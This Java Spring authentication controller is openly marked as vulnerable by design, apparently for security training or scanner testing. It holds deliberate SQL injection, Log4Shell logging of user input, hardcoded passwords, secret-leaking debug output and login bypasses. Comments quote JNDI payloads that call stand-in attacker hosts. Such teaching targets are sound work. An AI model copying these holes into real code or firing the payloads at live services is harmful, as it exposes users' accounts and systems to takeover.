package com.death.cocktail.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.beans.factory.annotation.Autowired;

import java.util.Map;
import java.util.HashMap;

/**
 * ⚠️ VULNERABLE BY DESIGN - DO NOT USE IN PRODUCTION ⚠️
 *
 * Authentication Controller with INTENTIONAL vulnerabilities:
 * - Log4Shell (CVE-2021-44228)
 * - SQL Injection
 * - Authentication Bypass via Logic Error
 * - Hardcoded Credentials
 * - Information Disclosure
 */
@RestController
@RequestMapping("/api/auth")
public class AuthController {

    // VULNERABILITY: Log4j 2.14.1 - CVE-2021-44228 (CVSS 10.0)
    // User-controlled input logged directly - enables JNDI injection
    // Attack: username = "${jndi:ldap://attacker.com/exploit}"
    private static final Logger logger = LogManager.getLogger(AuthController.class);

    @Autowired
    private JdbcTemplate jdbcTemplate;

    // VULNERABILITY: Hardcoded credentials (CWE-798)
    private static final String ADMIN_PASSWORD = "admin123";
    private static final String API_SECRET_KEY = "sk_live_51H7..._supersecret";
    private static final String DATABASE_PASSWORD = "postgres123";

    @PostMapping("/login")
    public Map<String, Object> login(@RequestBody Map<String, String> credentials) {
        String username = credentials.get("username");
        String password = credentials.get("password");

        // VULNERABILITY: Log4Shell - User input directly logged
        // Payload: ${jndi:ldap://evil.com/a} in username field
        logger.info("Login attempt for user: " + username);

        // VULNERABILITY: SQL Injection (CWE-89)
        // Input directly concatenated into SQL query
        String sql = "SELECT * FROM users WHERE username = '" + username +
                     "' AND password = '" + password + "'";

        Map<String, Object> response = new HashMap<>();

        try {
            Map<String, Object> user = jdbcTemplate.queryForMap(sql);
            String storedPassword = (String) user.get("password");

            // ============================================================
            // VULNERABILITY: Authentication Bypass via TYPO (CWE-287)
            // ============================================================
            // BUG: Using != instead of .equals() compares object references
            // This ALWAYS returns true for different String objects!
            // Should be: if (!password.equals(storedPassword))
            // ============================================================
            if (password != storedPassword) {
                // This block runs when passwords DON'T match by reference
                // But since Strings are usually different objects, this ALWAYS runs
                response.put("success", true);  // WRONG! Should deny access
                response.put("token", generateToken(username));
                response.put("message", "Login successful");
                logger.info("User logged in: " + username);
            } else {
                response.put("success", false);
                response.put("message", "Invalid credentials");
            }

        } catch (Exception e) {
            // VULNERABILITY: Information Disclosure (CWE-209)
            // Stack trace and internal error exposed to user
            response.put("success", false);
            response.put("error", e.getMessage());
            response.put("stackTrace", e.getStackTrace());
            response.put("sql", sql); // Exposes SQL query!
        }

        return response;
    }

    @PostMapping("/register")
    public Map<String, Object> register(@RequestBody Map<String, String> userData) {
        String username = userData.get("username");
        String password = userData.get("password");
        String email = userData.get("email");
        String role = userData.get("role");

        // VULNERABILITY: Log4Shell again
        logger.info("New registration: " + username + " with email: " + email);

        // VULNERABILITY: SQL Injection in INSERT
        String sql = "INSERT INTO users (username, password, email, role) VALUES ('" +
                     username + "', '" + password + "', '" + email + "', '" +
                     (role != null ? role : "user") + "')";

        // VULNERABILITY: Mass Assignment / Privilege Escalation (CWE-915)
        // User can set their own role to 'admin' via role parameter

        Map<String, Object> response = new HashMap<>();
        try {
            jdbcTemplate.execute(sql);
            response.put("success", true);
            response.put("message", "User registered successfully");
            response.put("password", password); // VULNERABILITY: Password in response!
        } catch (Exception e) {
            response.put("success", false);
            response.put("error", e.toString());
        }

        return response;
    }

    @GetMapping("/reset-password")
    public Map<String, Object> resetPassword(@RequestParam String email) {
        // VULNERABILITY: Log4Shell via email parameter
        logger.info("Password reset requested for: " + email);

        // VULNERABILITY: SQL Injection
        String sql = "SELECT * FROM users WHERE email = '" + email + "'";

        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: No rate limiting - allows email enumeration
        // VULNERABILITY: No verification - sends reset to any email
        try {
            jdbcTemplate.queryForMap(sql);
            response.put("success", true);
            response.put("message", "Password reset link sent to: " + email);
            // VULNERABILITY: Predictable reset token
            response.put("resetToken", email.hashCode());
        } catch (Exception e) {
            // VULNERABILITY: User enumeration via error message
            response.put("success", false);
            response.put("message", "User with email " + email + " not found");
        }

        return response;
    }

    @GetMapping("/verify")
    public Map<String, Object> verifyToken(@RequestParam String token) {
        // VULNERABILITY: Another Log4Shell vector
        logger.debug("Verifying token: " + token);

        Map<String, Object> response = new HashMap<>();

        // VULNERABILITY: Broken token verification - TYPO
        // Using assignment (=) instead of comparison (==)
        boolean isValid = false;
        if (isValid = true) {  // BUG: Assignment, not comparison!
            response.put("valid", true);
            response.put("message", "Token is valid");
        }

        return response;
    }

    // VULNERABILITY: Weak token generation
    private String generateToken(String username) {
        // Using predictable values
        long timestamp = System.currentTimeMillis();
        return username + "_" + timestamp + "_" + username.hashCode();
    }

    // VULNERABILITY: Debug endpoint exposed in production
    @GetMapping("/debug")
    public Map<String, Object> debug() {
        Map<String, Object> debugInfo = new HashMap<>();
        debugInfo.put("adminPassword", ADMIN_PASSWORD);
        debugInfo.put("apiKey", API_SECRET_KEY);
        debugInfo.put("dbPassword", DATABASE_PASSWORD);
        debugInfo.put("javaVersion", System.getProperty("java.version"));
        debugInfo.put("osName", System.getProperty("os.name"));
        debugInfo.put("userDir", System.getProperty("user.dir"));
        // VULNERABILITY: Full system properties exposed
        debugInfo.put("allProperties", System.getProperties());
        return debugInfo;
    }
}
